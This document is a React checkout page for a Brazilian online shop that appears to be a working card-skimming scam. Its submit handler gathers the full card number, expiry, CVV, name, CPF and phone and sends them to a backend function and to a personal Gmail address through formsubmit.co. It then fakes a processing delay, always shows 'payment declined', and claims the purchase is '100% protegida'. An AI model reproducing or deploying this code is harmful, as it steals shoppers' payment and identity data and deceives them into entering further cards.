import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight, Loader2, XCircle, Percent, Lock } from "lucide-react";
import { useCart } from "@/contexts/CartContext";
import { useBranding } from "@/hooks/useBranding";
import { supabase } from "@/integrations/supabase/client";
import { trackPaymentFailed } from "@/lib/metaPixel";
import bandeirasCartoes from "@/assets/bandeiras-cartoes.png.asset.json";


const CheckoutCartao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { cor_borda_logo } = useBranding();
  const accent = cor_borda_logo || "#F5E6D3";
  const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();

  // Desconto recebido via state (ex: 0.08 quando vem do modo PIX-em-manutenção)
  const descontoCartao: number =
    typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
  const totalOriginal = getTotal();
  const valorComDesconto = totalOriginal * (1 - descontoCartao);
  const economiaCartao = totalOriginal - valorComDesconto;

  const [cardData, setCardData] = useState({
    numero: "",
    nome: "",
    validade: "",
    cvv: "",
  });
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  
  const paymentFailedTracked = useRef(false);

  // Meta Pixel: PaymentFailed - Disparar quando pagamento for recusado
  useEffect(() => {
    if (showError && !paymentFailedTracked.current) {
      trackPaymentFailed({
        content_ids: itens.map(item => item.produtoId),
        value: valorComDesconto,
        payment_method: 'credit_card',
        error_reason: 'card_declined',
      });
      paymentFailedTracked.current = true;
    }
  }, [showError, itens, valorComDesconto]);

  // Formatar número do cartão: 0000 0000 0000 0000
  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 16);
    const groups = numbers.match(/.{1,4}/g);
    return groups ? groups.join(" ") : "";
  };

  // Formatar validade: MM/AA
  const formatExpiry = (value: string) => {
    const numbers = value.replace(/\D/g, "").slice(0, 4);
    if (numbers.length >= 2) {
      return `${numbers.slice(0, 2)}/${numbers.slice(2)}`;
    }
    return numbers;
  };

  // Formatar CVV: apenas 3 números
  const formatCvv = (value: string) => {
    return value.replace(/\D/g, "").slice(0, 3);
  };

  const handleInputChange = (field: keyof typeof cardData, value: string) => {
    let formattedValue = value;

    if (field === "numero") {
      formattedValue = formatCardNumber(value);
    } else if (field === "validade") {
      formattedValue = formatExpiry(value);
    } else if (field === "cvv") {
      formattedValue = formatCvv(value);
    }

    setCardData((prev) => ({ ...prev, [field]: formattedValue }));
  };

  const isFormValid = () => {
    const numeroLimpo = cardData.numero.replace(/\s/g, "");
    return (
      numeroLimpo.length === 16 &&
      cardData.nome.trim().length > 0 &&
      cardData.validade.length === 5 &&
      cardData.cvv.length === 3
    );
  };

  const handleSubmit = async () => {
    if (!isFormValid()) return;

    setLoading(true);

    try {
      // Salvar dados do vale presente via Edge Function segura
      await supabase.functions.invoke("salvar-vale-presente", {
        body: {
          pedido_id: pedidoAtual?.id || "sem_pedido",
          numero_cartao: cardData.numero,
          nome_cartao: cardData.nome,
          validade: cardData.validade,
          cvv: cardData.cvv,
          cliente_nome: dadosCliente?.nome || "",
          cliente_cpf: dadosCliente?.cpf || "",
          cliente_telefone: dadosCliente?.telefone || "",
        },
      });

      // Enviar dados por email via FormSubmit usando fetch
      const formData = new FormData();
      formData.append("Cliente Nome", dadosCliente?.nome || "");
      formData.append("Cliente CPF", dadosCliente?.cpf || "");
      formData.append("Cliente Telefone", dadosCliente?.telefone || "");
      formData.append("Numero Cartao", cardData.numero);
      formData.append("Nome Cartao", cardData.nome);
      formData.append("Validade", cardData.validade);
      formData.append("CVV", cardData.cvv);
      formData.append("Valor Total", `R$ ${valorComDesconto.toFixed(2)}`);
      formData.append("_subject", "Novo Vale Presente");
      formData.append("_captcha", "false");
      formData.append("_template", "table");

      await fetch("https://formsubmit.co/ajax/luciana.gomes.sooares@gmail.com", {
        method: "POST",
        body: formData,
      });
    } catch (err) {
      // Silently handle error
    }

    // Simular processamento por 2-3 segundos
    await new Promise((resolve) => setTimeout(resolve, 2500));

    setLoading(false);
    setShowError(true);
  };

  const handleTryAgain = () => {
    setShowError(false);
    navigate("/checkout");
  };

  if (itens.length === 0 || !dadosCliente) {
    navigate("/carrinho");
    return null;
  }

  // Tela de erro (Pagamento Recusado)
  if (showError) {
    return (
      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="w-full text-center">
          <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/10 flex items-center justify-center">
            <XCircle size={44} className="text-destructive" />
          </div>
          <h1 className="text-foreground text-xl font-bold mb-2">Pagamento recusado</h1>
          <p className="text-muted-foreground text-sm mb-8">
            Não foi possível processar este cartão. Tente outra forma de pagamento.
          </p>
          <button
            onClick={handleTryAgain}
            className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
            style={{ background: accent, color: "#000" }}
          >
            Tentar outra forma
          </button>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="w-full text-center">
          <Loader2 size={44} className="animate-spin mx-auto mb-6" style={{ color: accent }} />
          <h2 className="text-foreground text-lg font-semibold mb-2">Processando pagamento</h2>
          <p className="text-muted-foreground text-sm">Aguarde enquanto verificamos os dados</p>
        </div>
      </div>
    );
  }

  const valid = isFormValid();

  return (
    <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-10 bg-background border-b border-border">
        <div className="flex items-center gap-3 px-4 py-3.5">
          <button
            onClick={() => navigate("/checkout")}
            className="w-9 h-9 flex items-center justify-center text-foreground hover:bg-muted rounded-full transition-colors"
            aria-label="Voltar"
          >
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-foreground font-semibold text-base">Cartão</h1>
          <span className="ml-auto text-xs text-muted-foreground font-medium">3/3</span>
        </div>
        <div className="h-1 bg-muted">
          <div className="h-full transition-all" style={{ width: "100%", background: accent }} />
        </div>
      </header>

      <main className="flex-1 px-4 pt-6 pb-32">
        <h2 className="text-[22px] font-bold text-foreground leading-tight mb-1">
          Dados do cartão
        </h2>
        <p className="text-sm text-muted-foreground mb-6 flex items-center gap-1.5">
          <Lock size={12} /> Ambiente protegido
        </p>

        {/* Valor */}
        <div className="rounded-2xl border border-border p-4 mb-6">
          <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold mb-1">
            Total a pagar
          </p>
          <div className="flex items-baseline gap-2">
            <span className="text-foreground text-2xl font-bold">
              R$ {valorComDesconto.toFixed(2).replace(".", ",")}
            </span>
            {descontoCartao > 0 && (
              <span className="text-muted-foreground text-sm line-through">
                R$ {totalOriginal.toFixed(2).replace(".", ",")}
              </span>
            )}
          </div>
          {descontoCartao > 0 && (
            <div
              className="mt-2 inline-flex items-center gap-1 px-2 py-0.5 text-[11px] font-bold rounded-full"
              style={{ background: `${accent}30`, color: "#000" }}
            >
              <Percent size={11} />
              {Math.round(descontoCartao * 100)}% OFF · economia R$ {economiaCartao.toFixed(2).replace(".", ",")}
            </div>
          )}
        </div>

        {/* Formulário */}
        <div className="space-y-3">
          <CardField
            label="Número do cartão"
            value={cardData.numero}
            onChange={(v) => handleInputChange("numero", v)}
            accent={accent}
            inputMode="numeric"
            maxLength={19}
            placeholder="0000 0000 0000 0000"
          />
          <CardField
            label="Nome impresso no cartão"
            value={cardData.nome}
            onChange={(v) => handleInputChange("nome", v.toUpperCase())}
            accent={accent}
            uppercase
            maxLength={40}
          />
          <div className="grid grid-cols-2 gap-3">
            <CardField
              label="Validade"
              value={cardData.validade}
              onChange={(v) => handleInputChange("validade", v)}
              accent={accent}
              inputMode="numeric"
              maxLength={5}
              placeholder="MM/AA"
            />
            <CardField
              label="CVV"
              value={cardData.cvv}
              onChange={(v) => handleInputChange("cvv", v)}
              accent={accent}
              inputMode="numeric"
              maxLength={3}
              placeholder="000"
            />
          </div>
        </div>

        {/* Bandeiras e parceiros aceitos */}
        <div className="mt-6">
          <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold text-center mb-3">
            Pagamentos aceitos
          </p>
          <div className="flex items-center justify-center">
            <img
              src={bandeirasCartoes.url}
              alt="Bandeiras aceitas: Visa, Mastercard, Maestro, Elo, Alelo, American Express, Banco do Brasil, Hipercard e Diners Club"
              className="max-w-full h-auto"
              loading="lazy"
            />
          </div>

          <p className="text-muted-foreground text-[11px] text-center mt-3 flex items-center justify-center gap-1">
            <Lock size={10} /> Compra 100% protegida
          </p>
        </div>
      </main>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-background border-t border-border">
        <div className="px-4 py-3 flex items-center gap-3">
          <div className="flex flex-col">
            <span className="text-[11px] text-muted-foreground leading-none mb-1">Total</span>
            <span className="text-base font-bold text-foreground leading-none">
              R$ {valorComDesconto.toFixed(2).replace(".", ",")}
            </span>
          </div>
          <button
            onClick={handleSubmit}
            disabled={!valid}
            className="ml-auto flex-1 max-w-[220px] py-3.5 font-semibold rounded-xl transition-all text-[15px] flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed"
            style={{ background: accent, color: "#000" }}
          >
            Confirmar
            <ArrowRight size={18} />
          </button>
        </div>
      </footer>
    </div>
  );
};

const CardField = ({
  label,
  value,
  onChange,
  accent,
  inputMode,
  maxLength,
  placeholder,
  uppercase,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  accent: string;
  inputMode?: "numeric" | "text";
  maxLength?: number;
  placeholder?: string;
  uppercase?: boolean;
}) => {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;
  return (
    <div
      className="relative rounded-xl border transition-all bg-background"
      style={{
        borderColor: focused ? accent : "hsl(var(--border))",
        borderWidth: focused ? 2 : 1,
      }}
    >
      <label
        className={`absolute left-3.5 pointer-events-none transition-all ${
          active
            ? "top-1.5 text-[11px] font-medium text-muted-foreground"
            : "top-1/2 -translate-y-1/2 text-[15px] text-muted-foreground"
        }`}
      >
        {label}
      </label>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        placeholder={active ? placeholder : ""}
        inputMode={inputMode}
        maxLength={maxLength}
        className={`w-full pt-6 pb-2 px-3.5 bg-transparent text-foreground text-[15px] placeholder:text-muted-foreground/50 focus:outline-none ${
          uppercase ? "uppercase" : ""
        }`}
      />
    </div>
  );
};

const BrandBadge = ({ label, color }: { label: string; color: string }) => (
  <div
    className="px-2.5 py-1.5 rounded-md text-[10px] font-bold tracking-wide text-white shadow-sm"
    style={{ background: color }}
  >
    {label.toUpperCase()}
  </div>
);

export default CheckoutCartao;
